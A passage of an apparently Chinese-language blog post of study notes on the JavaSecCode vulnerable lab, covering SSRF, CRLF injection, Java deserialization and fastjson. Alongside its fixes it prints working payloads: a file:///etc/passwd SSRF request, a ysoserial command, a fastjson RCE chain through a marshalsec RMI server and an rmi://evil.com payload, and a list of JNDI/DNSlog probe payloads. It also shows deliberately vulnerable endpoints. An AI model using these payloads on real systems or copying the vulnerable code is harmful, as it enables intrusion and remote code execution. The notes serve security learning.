+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; fix code</span><br><span class="line">String sql &#x3D; &quot;select * from users where username &#x3D; ?&quot;;</span><br><span class="line">PreparedStatement st &#x3D; con.prepareStatement(sql);</span><br><span class="line">st.setString(1, username);</span><br></pre></td></tr></table></figure>
+
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>服务器请求伪造，用于发起服务器端的请求来进行探测，在协议不限制的情况，也可以进行文件读取，请求如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<p>查看代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;urlConnection&#x2F;vuln&quot;, method &#x3D; &#123;RequestMethod.POST, RequestMethod.GET&#125;)</span><br><span class="line">public String URLConnectionVuln(String url) &#123;</span><br><span class="line">    return HttpUtils.URLConnection(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进直接带入HttpUtils.URLConnection() ,这里使用了<a href="https://javasec.org/javase/URLConnection/" target="_blank" rel="noopener">urlConnection</a>类，造成文件读取的问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public static String URLConnection(String url) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        URL u &#x3D; new URL(url);</span><br><span class="line">        URLConnection urlConnection &#x3D; u.openConnection();</span><br><span class="line">        BufferedReader in &#x3D; new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); &#x2F;&#x2F;send request</span><br><span class="line">        String inputLine;</span><br><span class="line">        StringBuilder html &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">        while ((inputLine &#x3D; in.readLine()) !&#x3D; null) &#123;</span><br><span class="line">            html.append(inputLine);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line">        return html.toString();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        logger.error(e.getMessage());</span><br><span class="line">        return e.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>安全修复代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;urlConnection&#x2F;sec&quot;)</span><br><span class="line">public String URLConnectionSec(String url) &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Decline not http&#x2F;https protocol</span><br><span class="line">    if (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">        return &quot;[-] SSRF check failed&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        SecurityUtil.startSSRFHook();</span><br><span class="line">        return HttpUtils.URLConnection(url);</span><br><span class="line">    &#125; catch (SSRFException | IOException e) &#123;</span><br><span class="line">        return e.getMessage();</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        SecurityUtil.stopSSRFHook();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进SecurityUtil.isHttp，判断是否是HTTP协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static boolean isHttp(String url) &#123;</span><br><span class="line">    return url.startsWith(&quot;http:&#x2F;&#x2F;&quot;) || url.startsWith(&quot;https:&#x2F;&#x2F;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h2><p>在HTTP当中HTTP的Header和Body之间就是用两个crlf进行分隔的</p>
+<p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image11.png" alt="image"></p>
+<p>如果能控制HTTP消息头中的字符，注入一些恶意的换行，这样就能注入一些会话cookie和html代码，所以CRLF injection 又叫做 HTTP response Splitting，简称HRS。CRLF漏洞可以造成Cookie会话固定和反射型XSS(可过waf)的危害，注入XSS的利用方式：连续使用两次%0d%oa就会造成header和body之间的分离，就可以在其中插入xss代码形成反射型xss漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;baidu.com&#x2F;xxx%0a%0dSet-Cookie: test123&#x3D;123  &#x2F;&#x2F; 恶意添加修改信息</span><br></pre></td></tr></table></figure>
+
+<p>关于实战，这里有几个案例，学习一波。</p>
+<ol>
+<li><a href="https://www.v0n.top/2020/01/29/CRLF%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">CRLF注入</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" target="_blank" rel="noopener">Bottle HTTP 头注入漏洞探究</a></li>
+<li><a href="https://www.cnblogs.com/tr1ple/p/6648767.html" target="_blank" rel="noopener">案例</a></li>
+</ol>
+<p>但是，大多数现代应用程序服务器(无论用什么语言编写的代码)，都已经不存在HTTP响应拆分漏洞，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;safecode&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public void crlf(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    &#x2F;&#x2F; response.addHeader 添加头文件信息</span><br><span class="line">    response.addHeader(&quot;test1&quot;, request.getParameter(&quot;test1&quot;));</span><br><span class="line">    response.setHeader(&quot;test2&quot;, request.getParameter(&quot;test2&quot;));</span><br><span class="line">    &#x2F;&#x2F;  request.getParameter 获取值</span><br><span class="line">    String author &#x3D; request.getParameter(&quot;test3&quot;);</span><br><span class="line">    Cookie cookie &#x3D; new Cookie(&quot;test3&quot;, author);</span><br><span class="line">    response.addCookie(cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试如下：</p>
+<p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image12.png" alt="image"></p>
+<h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;deserialize&quot;)</span><br><span class="line">public class Deserialize &#123;</span><br><span class="line"></span><br><span class="line">    protected final Logger logger &#x3D; LoggerFactory.getLogger(this.getClass());</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64</span><br><span class="line">     * Add the result to rememberMe cookie.</span><br><span class="line">     * &lt;p&gt;</span><br><span class="line">     * http:&#x2F;&#x2F;localhost:8080&#x2F;deserialize&#x2F;rememberMe&#x2F;vuln</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @RequestMapping(&quot;&#x2F;rememberMe&#x2F;vuln&quot;)</span><br><span class="line">    public String rememberMeVul(HttpServletRequest request)</span><br><span class="line">            throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        &#x2F;&#x2F; 获取名字为 rememberMe 的cookie值</span><br><span class="line">        Cookie cookie &#x3D; getCookie(request, Constants.REMEMBER_ME_COOKIE);</span><br><span class="line">        if (null &#x3D;&#x3D; cookie) &#123;</span><br><span class="line">            return &quot;No rememberMe cookie. Right?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; 获取cookie rememberMe 内容</span><br><span class="line">        String rememberMe &#x3D; cookie.getValue();</span><br><span class="line">        &#x2F;&#x2F; base64 解码</span><br><span class="line">        byte[] decoded &#x3D; Base64.getDecoder().decode(rememberMe);</span><br><span class="line">        ByteArrayInputStream bytes &#x3D; new ByteArrayInputStream(decoded);</span><br><span class="line">        &#x2F;&#x2F; ObjectInputStream是将对象的原始数据序列化</span><br><span class="line">        ObjectInputStream in &#x3D; new ObjectInputStream(bytes);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">        return &quot;Are u ok?&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>使用<a href="https://github.com/angelwhu/ysoserial" target="_blank" rel="noopener">ysoserial</a>生成payload,需要管理员权限。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64</span><br></pre></td></tr></table></figure>
+
+<p>测试，弹出计算器<br><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image13.png" alt="image"></p>
+<p>修复代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;rememberMe&#x2F;security&quot;)</span><br><span class="line">public String rememberMeBlackClassCheck(HttpServletRequest request)</span><br><span class="line">        throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    Cookie cookie &#x3D; getCookie(request, Constants.REMEMBER_ME_COOKIE);</span><br><span class="line"></span><br><span class="line">    if (null &#x3D;&#x3D; cookie) &#123;</span><br><span class="line">        return &quot;No rememberMe cookie. Right?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String rememberMe &#x3D; cookie.getValue();</span><br><span class="line">    byte[] decoded &#x3D; Base64.getDecoder().decode(rememberMe);</span><br><span class="line"></span><br><span class="line">    ByteArrayInputStream bytes &#x3D; new ByteArrayInputStream(decoded);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        AntObjectInputStream in &#x3D; new AntObjectInputStream(bytes);  &#x2F;&#x2F; throw InvalidClassException</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125; catch (InvalidClassException e) &#123;</span><br><span class="line">        logger.info(e.toString());</span><br><span class="line">        return e.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;I&#39;m very OK.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>具体还是看不懂，相关研究资料如下：</p>
+<ol>
+<li><a href="https://xz.aliyun.com/t/41/" target="_blank" rel="noopener">浅谈Java反序列化漏洞修复方案</a></li>
+<li><a href="http://www.lmxspace.com/2019/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%B7%B1%E7%A9%B6/" target="_blank" rel="noopener">Java反序列化过程深究</a></li>
+</ol>
+<h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><p>首先请求需要为POST，ontent-Type设置为application/json，暴露使用的fastjson:</p>
+<p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image14.png" alt="image"></p>
+<p>fastjson 1.2.24 反序列化导致<code>任意命令执行漏洞</code>，测试如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TouchFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">"touch"</span>, <span class="string">"/tmp/success"</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译上述代码，并上传的我们搭建的服务器中（静态资源部署就行）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac TouchFile.java          &#x2F;&#x2F;进行编译</span><br><span class="line">python3 -m http.server 8080   &#x2F;&#x2F;简单搭建web服务</span><br></pre></td></tr></table></figure>
+<p>将<code>TouchFile.class</code> 文件放在web服务根目录下，使其可以被访问到：</p>
+<p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image15.png" alt="image"></p>
+<p>然后我们借助<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>。首先在VPS安装marshalsec：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;mbechler&#x2F;marshalsec.git</span><br><span class="line">cd marshalsec&#x2F;</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
+<p>配置好如下：</p>
+<p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image16.png" alt="image"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root/marshalsec/marshalsec/target/</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://124.70.82.229:8080/#TouchFile 9998</span><br></pre></td></tr></table></figure>
+
+<p>在显示监听后，在客户端发送请求payload，返回500是正常的，主要看创建文件是否成功</p>
+<p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image17.png" alt="image"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: your-ip:8090</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 160</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    "b":&#123;</span><br><span class="line">        "@type":"com.sun.rowset.JdbcRowSetImpl",</span><br><span class="line">        "dataSourceName":"rmi://evil.com:9999/TouchFile",</span><br><span class="line">        "autoCommit":true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看<code>/tmp</code> 下的目录，创建success文件</p>
+<p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image18.png" alt="image"></p>
+<p>简单<code>验证</code>的话，直接使用DNS判断就好：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;fastjson&#x2F;deserialize HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.66 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: remember-me&#x3D;YWRtaW46MTYwODYwMDAyMDA3MzpiMjMyODY2ODRjYmQ5N2ExYTMyYjlmZDQ4ZjU3OGZmMQ; XSRF-TOKEN&#x3D;10e944c1-b957-4db6-8f87-497ecbd23e47; JSESSIONID&#x3D;21DEEF6B9C43221FDF213419AA77B0F3</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 73</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;uhiuod.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image19.png" alt="image"></p>
+<p>除此之外，还有其他的NDS验证payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;, &quot;jndiNames&quot;:[&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;], &quot;Realms&quot;:[&quot;&quot;]&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;asText&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123;&quot;@type&quot;:&quot;java.util.Hashtable&quot;,&quot;java.naming.factory.initial&quot;:&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,&quot;topic-factory&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;, &quot;namespace&quot;:&quot;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;, &quot;autoCommit&quot;:true&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;rmi:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;,&quot;Object&quot;:&quot;a&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;rmi:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;rmi:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ol>
+<li><a href="https://paper.seebug.org/1274/" target="_blank" rel="noopener">Fastjson 1.2.24 反序列化漏洞深度分析</a></li>
+<li><a href="https://github.com/alibaba/fastjson/issues/3077" target="_blank" rel="noopener">发现最新版本1.2.67依然可以通过dnslog判断正确是否使用fastjson</a></li>
+</ol>
+<h2 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h2><ol>
+<li><a href="https://yinwc.github.io/2020/01/03/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" target="_blank" rel="noopener">Java代码审计</a></li>
+<li><a href="https://www.cnblogs.com/r00tuser/p/10577571.html" target="_blank" rel="noopener">java代码审计文章集合</a></li>
+<li><a href="https://www.mi1k7ea.com/2019/08/20/JSONP%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">JSONP跨域漏洞总结</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/149187997" target="_blank" rel="noopener">Jsonp漏洞简析及自动化漏洞挖掘脚本编写</a></li>
+<li><a href="https://xz.aliyun.com/t/7242" target="_blank" rel="noopener">浅析CORS攻击及其挖洞思路</a></li>
+<li><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">了解SSRF,这一篇就足够了</a></li>
+<li><a href="https://www.cnblogs.com/mysticbinary/p/12560080.html" target="_blank" rel="noopener">CRLF注入原理
+</a></li>
+<li><a href="https://javasec.org/javase/JavaDeserialization/Serialization.html" target="_blank" rel="noopener">ObjectInputStream，ObjectOutputStream</a></li>
+<li><a href="https://xz.aliyun.com/t/7945" target="_blank" rel="noopener">java代码审计</a></li>
+</ol>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>ShangZeng</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
